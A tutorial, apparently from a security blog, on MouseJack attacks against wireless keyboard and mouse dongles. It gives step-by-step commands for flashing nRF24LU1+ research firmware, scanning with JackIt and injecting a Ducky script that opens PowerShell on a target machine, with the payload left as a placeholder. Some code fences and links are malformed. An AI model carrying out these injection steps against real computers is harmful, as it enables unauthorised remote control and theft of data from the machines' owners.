Wireless mice and keyboards manufactured by Logitech, Dell, HP, and Microsoft are all affected by many of the [MouseJack vulnerabilities](https://github.com/BastilleResearch/mousejack). An attacker with an [nRF24LU1+](https://www.amazon.com/dp/B00VYA3A2U/) can wirelessly inject keystrokes into most of these USB dongles (shown below) as well as sniff keystrokes. Ultimately, it allows the attacker to remotely control a computer from up to 250-feet away.

The concept of keystroke sniffing and injection was first made public by [Thorsten Schroeder and Max Moser](http://www.remote-exploit.org/content/keykeriki_v2_cansec_v1.1.pdf) in 2010. Later, Samy Kamkar debuted [KeySweeper](https://samy.pl/keysweeper/), an Arduino-based USB wall charger designed to passively sniff and log keystrokes made by Microsoft keyboards.

Below is an example of wireless keystroke injection attacks performed from 75-feet away. Notice the vulnerable Logitech USB dongle attached to my laptop.

### Flash the Firmware

Several dependencies are required to execute the Python scripts used to build and automate the flashing process.

```
$ apt-get install sdcc binutils python python-pip git
$ pip install --upgrade pip
$ pip install --upgrade -I pyusb
$ pip install --upgrade platformio
```

Clone the MouseJack repository of scripts on GitHub into the `/opt` directory.

```
$ git clone https://github.com/BastilleResearch/mousejack /opt/mousejack

Cloning into '/opt/mousejack'...
remote: Enumerating objects: 285, done.
remote: Total 285 (delta 0), reused 0 (delta 0), pack-reused 285
Receiving objects: 100% (285/285), 8.63 MiB | 353.00 KiB/s, done.
Resolving deltas: 100% (131/131), done.
```

Change into the new `mousejack/` directory. Use the `submodule init` options to initialize the local configuration file for the [nrf-research-firmware](https://github.com/BastilleResearch/nrf-research-firmware). This is the firmware being flashed onto the nRF24LU1+ device.

```
/opt/mousejack$ git submodule init

Submodule 'nrf-research-firmware' (https://github.com/BastilleResearch/nrf-research-firmware.git) registered for path 'nrf-research-firmware'
```

Use the `submodule update` options to fetch all the data and checkout the appropriate commit listed.

```
/opt/mousejack$ git submodule update

Cloning into '/opt/mousejack/nrf-research-firmware'...
Submodule path 'nrf-research-firmware': checked out '02b84d1c4e59c0fb98263c83b2e7c7f9863a3b93'
```

Change into the `nrf-research-firmware/` directory. With `make`, execute the Makefile.

```
nrf-research-firmware$ make

mkdir -p bin
sdcc --model-large --std-c99 -c src/main.c -o bin/main.rel
sdcc --model-large --std-c99 -c src/usb.c -o bin/usb.rel
sdcc --model-large --std-c99 -c src/usb_desc.c -o bin/usb_desc.rel
sdcc --model-large --std-c99 -c src/radio.c -o bin/radio.rel
sdcc --xram-loc 0x8000 --xram-size 2048 --model-large bin/main.rel bin/usb.rel bin/usb_desc.rel bin/radio.rel -o bin/dongle.ihx
objcopy -I ihex bin/dongle.ihx -O binary bin/dongle.bin
objcopy --pad-to 26622 --gap-fill 255 -I ihex bin/dongle.ihx -O binary bin/dongle.formatted.bin
objcopy -I binary bin/dongle.formatted.bin -O ihex bin/dongle.formatted.ihx
```

At this point, the nRF24LU1+ device should be inserted into the computer. 

<img src="img/005-01.jpg" width="1080"> 

Then, execute the `make install` command.


```
/nrf-research-firmware$ make install

```

As instructed, unplug the nRF24LU1+ from the computer. To verify the firmware was flashed, plug it back into the computer and use the `dmesg` command. The product and manufacture lines should read "**Research Firmware**" and "**RFStorm**," respectively.

```
/nrf-research-firmware$ dmesg

```

### Clone the JackIt Repository

There are several great Python scripts included in the MouseJack repository, but we'll instead use [JackIt](https://github.com/insecurityofthings/jackit) to automate keystroke injection.

```
$ git clone https://github.com/insecurityofthings/jackit.git /opt/jackit

Cloning into '/opt/jackit'...
remote: Enumerating objects: 718, done.
remote: Total 718 (delta 0), reused 0 (delta 0), pack-reused 718
Receiving objects: 100% (718/718), 171.39 KiB | 153.00 KiB/s, done.
Resolving deltas: 100% (439/439), done.
```

Change into the new `jackit/` directory and install dependencies with `pip`.

```
/opt/jackit$ pip install -e .

### Attack Wireless Keyboards & Mice

Scan the surrounding area for vulnerable devices by simply typing `jackit` into any terminal. JackIt will continuously scan the area for wireless mice and keyboards. A vulnerable device will identify its address (serial number), channel, and type in the terminal. 

```bash
$ jackit

     ____.              __   .___  __
    |    |____    ____ |  | _|   |/  |_
    |    \__  \ _/ ___\|  |/ /   \   __\
/\__|    |/ __ \\  \___|    <|   ||  |

```

This information can be used for a targeted attack. For example, the below USB Rubber Ducky payload is used to open a run window and inject keystrokes into the target computer.

```bat
GUI r
DELAY 1000
STRING powershell <payload here>
ENTER
```

Inject keystrokes into the target device with the following command.

```bash
$ jackit --reset --address C7:D4:21:98:07 --vendor Logitech --script /path/to/ducky/script.txt
```

Press `Ctrl + c` to stop scanning. JackIt will ask which address to inject the keystrokes. This is a targeted attack, so only one serial number will appear in the scan. Press `1`, then `Enter`.

When the keystrokes are injected, the device will perform the following actions.

The Ducky Script will open the run window and type some arbitrary text. In the above example, the Windows computer is backdoored in seconds. More complex PowerShell attacks may include Wi-Fi password exfiltration, [live streaming the Windows 10 desktop](https://null-byte.wonderhowto.com/how-to/android-for-hackers-backdoor-windows-10-livestream-desktop-without-rdp-0193190/), and Powercat reverse shells with [payloads hosted on Microsoft servers]([nRF24LU1+](https://www.amazon.com/dp/B00VYA3A2U/)).

### Final Thoughts

There are still so many vulnerable mice and keyboards in the wild. Since the [MouseJack white paper](https://github.com/BastilleResearch/mousejack/blob/master/doc/pdf/MouseJack-whitepaper-v1.1.pdf) was released in 2016, some vendors have issued firmware updates for products not utilizing one-time programmable memory (PROM). Still, most vulnerable USB dongles can't be patched due to hardware limitations. Even if they are patched, devices are [still](https://twitter.com/mame82/status/1101635558701436928) [vulnerable](https://twitter.com/mame82/status/1104044796761595904) [to attacks](https://twitter.com/mame82/status/1093859460102131717).
